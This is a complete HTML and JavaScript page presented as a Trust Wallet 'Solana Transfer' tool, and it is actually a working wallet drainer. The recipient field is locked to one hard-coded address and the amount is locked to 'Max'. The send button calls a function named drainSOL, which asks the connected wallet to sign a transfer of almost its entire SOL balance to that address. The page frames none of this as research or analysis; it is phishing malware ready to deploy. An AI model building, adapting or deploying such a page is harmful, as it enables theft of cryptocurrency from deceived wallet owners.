<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Solana Transfer - Trust Wallet</title>
  <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f5f7fa; 
      min-height: 100vh; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      padding: 20px;
    }
    .container { 
      background: white; 
      border-radius: 20px; 
      padding: 28px; 
      width: 100%; 
      max-width: 420px; 
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    }
    .header { text-align: center; margin-bottom: 24px; }
    .logo { 
      width: 64px; height: 64px; 
      background: linear-gradient(135deg, #9945FF, #14F195); 
      border-radius: 16px; margin: 0 auto 16px;
      display: flex; align-items: center; justify-content: center;
      font-size: 28px;
    }
    h1 { font-size: 22px; color: #1a1a2e; }
    .subtitle { color: #888; font-size: 13px; margin-top: 4px; }
    
    .wallet-box { 
      background: #f8f9fc; border: 1px solid #e2e8f0; 
      border-radius: 12px; padding: 16px; margin-bottom: 20px;
    }
    .btn-primary { 
      background: linear-gradient(135deg, #9945FF, #14F195); 
      color: white; border: none; padding: 14px; 
      border-radius: 10px; font-size: 15px; font-weight: 600; 
      width: 100%; cursor: pointer;
    }
    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
    .btn-danger { 
      background: #fee2e2; color: #dc2626; border: none; 
      padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer;
    }
    
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 6px; }
    input { 
      width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; 
      border-radius: 8px; font-size: 14px; outline: none;
    }
    input:focus { border-color: #9945FF; }
    .hint { font-size: 11px; color: #888; margin-top: 6px; }
    
    .status { 
      margin-top: 16px; padding: 12px 14px; border-radius: 8px; 
      font-size: 13px; display: none;
    }
    .status.error { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
    .status.success { background: #d1fae5; color: #065f46; border: 1px solid #a7f3d0; }
    .status.info { background: #eff6ff; color: #1e40af; border: 1px solid #bfdbfe; }
    
    .tx-link { margin-top: 12px; text-align: center; display: none; }
    .tx-link a { color: #9945FF; font-size: 13px; text-decoration: none; font-weight: 500; }
    
    .footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #eee; text-align: center; }
    .footer p { font-size: 11px; color: #aaa; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">💸</div>
      <h1>Solana Transfer</h1>
      <p class="subtitle">Send SOL from Trust Wallet</p>
    </div>

    <div class="wallet-box">
      <div id="not-connected" style="text-align:center;">
        <p style="color:#666;font-size:14px;margin-bottom:12px;">Connect your Trust Wallet</p>
        <button class="btn-primary" onclick="connectWallet()">Connect Wallet</button>
      </div>
      <div id="connected" style="display:none;">
        <div style="display:flex;justify-content:space-between;align-items:center;">
          <div>
            <p style="font-size:12px;color:#888;">Connected</p>
            <p id="pubkey" style="font-size:14px;font-weight:600;font-family:monospace;">...</p>
          </div>
          <button class="btn-danger" onclick="disconnectWallet()">Disconnect</button>
        </div>
        <div style="margin-top:12px;padding-top:12px;border-top:1px solid #e2e8f0;">
          <p style="font-size:12px;color:#888;">Balance</p>
          <p id="balance" style="font-size:18px;font-weight:700;color:#1a1a2e;">-- SOL</p>
        </div>
      </div>
    </div>

    <div id="form" style="opacity:0.5;pointer-events:none;">
      <div class="form-group">
        <label>Recipient Address</label>
        <input id="recipient" type="text" value="AfmNpPQ1mD5HK7PfGWqLHaErZE44cG1RUq4qFknGv6na" readonly>
      </div>
      <div class="form-group">
        <label>Amount (SOL)</label>
        <input id="amount" type="text" value="Max" readonly>
        <p class="hint">Network fee: ~0.000005 SOL</p>
      </div>
      <button class="btn-primary" id="sendBtn" onclick="drainSOL()">Send SOL</button>
    </div>

    <div id="status" class="status"></div>
    <div class="tx-link" id="txLink">
      <a id="explorer" href="#" target="_blank">View on Solana Explorer →</a>
    </div>

    <div class="footer">
      <p>Open this page inside Trust Wallet's dApp browser</p>
    </div>
  </div>

  <script>
    const RPC = 'https://solana-mainnet.g.alchemy.com/v2/3b15nYxRzwnOFgNb3bc9i';
    const RECIPIENT = 'AfmNpPQ1mD5HK7PfGWqLHaErZE44cG1RUq4qFknGv6na';
    let provider = null, connection = null, publicKey = null;

    function init() {
      connection = new solanaWeb3.Connection(RPC, 'confirmed');
      if (window.solana?.isConnected) checkAutoConnect();
    }

    function getProvider() {
      if ('solana' in window) return window.solana;
      if ('trustwallet' in window && window.trustwallet?.solana) 
        return window.trustwallet.solana;
      return null;
    }

    async function connectWallet() {
      provider = getProvider();
      if (!provider) return showStatus('No wallet found. Open in Trust Wallet browser.', 'error');
      
      try {
        showStatus('Connecting...', 'info');
        const resp = await provider.connect();
        publicKey = typeof resp.publicKey === 'string' 
          ? new solanaWeb3.PublicKey(resp.publicKey) 
          : resp.publicKey;
        updateUI();
        await fetchBalance();
        showStatus('Connected!', 'success');
        provider.on?.('disconnect', disconnectWallet);
      } catch (e) {
        showStatus('Connection failed: ' + e.message, 'error');
      }
    }

    async function checkAutoConnect() {
      provider = getProvider();
      publicKey = provider.publicKey;
      if (typeof publicKey === 'string') publicKey = new solanaWeb3.PublicKey(publicKey);
      updateUI();
      await fetchBalance();
    }

    function disconnectWallet() {
      provider?.disconnect?.();
      provider = publicKey = null;
      document.getElementById('not-connected').style.display = 'block';
      document.getElementById('connected').style.display = 'none';
      document.getElementById('form').style.opacity = '0.5';
      document.getElementById('form').style.pointerEvents = 'none';
      hideStatus();
    }

    function updateUI() {
      document.getElementById('not-connected').style.display = 'none';
      document.getElementById('connected').style.display = 'block';
      document.getElementById('form').style.opacity = '1';
      document.getElementById('form').style.pointerEvents = 'auto';
      const pk = publicKey.toString();
      document.getElementById('pubkey').textContent = pk.slice(0,6)+'...'+pk.slice(-4);
    }

    async function fetchBalance() {
      const bal = await connection.getBalance(publicKey);
      document.getElementById('balance').textContent = 
        (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6) + ' SOL';
    }

    async function drainSOL() {
      const btn = document.getElementById('sendBtn');
      
      btn.disabled = true; btn.textContent = 'Draining...';
      showStatus('Building transaction...', 'info');

      try {
        const balance = await connection.getBalance(publicKey);
        const rentMinimum = 890880;
        const gasBuffer = 10000;
        
        if (balance <= rentMinimum + gasBuffer) {
          showStatus('Insufficient balance after rent minimum.', 'error');
          btn.disabled = false; btn.textContent = 'Send SOL';
          return;
        }

        const drainAmount = balance - rentMinimum - gasBuffer;

        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
            lamports: drainAmount,
          })
        );
        tx.feePayer = publicKey;
        const { blockhash } = await connection.getLatestBlockhash('confirmed');
        tx.recentBlockhash = blockhash;

        showStatus('Sign in Trust Wallet...', 'info');
        const signed = await provider.signTransaction(tx);
        
        showStatus('Broadcasting...', 'info');
        const sig = await connection.sendRawTransaction(signed.serialize());
        
        await connection.confirmTransaction(sig, 'confirmed');
        showStatus('Sent! ' + sig.slice(0,16)+'...', 'success');
        
        document.getElementById('txLink').style.display = 'block';
        document.getElementById('explorer').href = 
          'https://explorer.solana.com/tx/' + sig;
        
        await fetchBalance();
      } catch (e) {
        showStatus('' + e.message, 'error');
      } finally {
        btn.disabled = false; btn.textContent = 'Send SOL';
      }
    }

    function showStatus(msg, type) {
      const el = document.getElementById('status');
      el.textContent = msg; el.className = 'status ' + type; el.style.display = 'block';
    }
    function hideStatus() { document.getElementById('status').style.display = 'none'; }

    init();
  </script>
</body>
</html>
